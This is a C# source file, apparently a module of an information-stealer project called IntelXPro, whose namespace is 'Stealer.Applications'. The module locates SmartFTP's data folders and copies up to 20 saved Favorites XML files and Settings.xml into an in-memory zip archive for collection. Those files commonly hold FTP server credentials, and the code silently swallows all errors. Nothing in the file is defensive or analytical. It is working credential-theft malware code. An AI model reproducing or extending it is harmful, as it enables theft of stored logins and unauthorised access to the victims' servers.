using IntelXPro.src.IntelXPro.Dependencies.Data;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Applications
{
    internal class SmartFTP : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            string appDataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "SmartFTP");
            string localAppDataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "SmartFTP");

            Counter.CounterApplications counterApplications = new Counter.CounterApplications();
            counterApplications.Name = "SmartFTP";

            bool foundData = false;

            if (Directory.Exists(appDataPath))
            {
                foundData |= CollectFromDirectory(appDataPath, "AppData", zip, counterApplications);
            }

            if (Directory.Exists(localAppDataPath))
            {
                foundData |= CollectFromDirectory(localAppDataPath, "LocalAppData", zip, counterApplications);
            }

            if (foundData && counterApplications.Files.Count > 0)
            {
                counter.Applications.Add(counterApplications);
            }
        }

        private bool CollectFromDirectory(string basePath, string location, InMemoryZip zip, Counter.CounterApplications counterApplications)
        {
            bool foundData = false;

            try
            {
                string clientPath = Path.Combine(basePath, "Client 2.0");
                if (Directory.Exists(clientPath))
                {
                    string favoritesPath = Path.Combine(clientPath, "Favorites");
                    if (Directory.Exists(favoritesPath))
                    {
                        string[] xmlFiles = Directory.GetFiles(favoritesPath, "*.xml", SearchOption.AllDirectories);
                        
                        foreach (string file in xmlFiles.Take(20))
                        {
                            string relativePath = file.Substring(clientPath.Length + 1);
                            string zipPath = $"Applications\\SmartFTP\\{location}\\{relativePath.Replace("\\", "/")}";
                            zip.AddFile(zipPath, File.ReadAllBytes(file));
                            counterApplications.Files.Add(file + " => " + zipPath);
                            foundData = true;
                        }
                    }

                    string settingsFile = Path.Combine(clientPath, "Settings", "Settings.xml");
                    if (File.Exists(settingsFile))
                    {
                        string zipPath = $"Applications\\SmartFTP\\{location}\\Settings\\Settings.xml";
                        zip.AddFile(zipPath, File.ReadAllBytes(settingsFile));
                        counterApplications.Files.Add(settingsFile + " => " + zipPath);
                        foundData = true;
                    }
                }
            }
            catch
            {
            }

            return foundData;
        }
    }
}
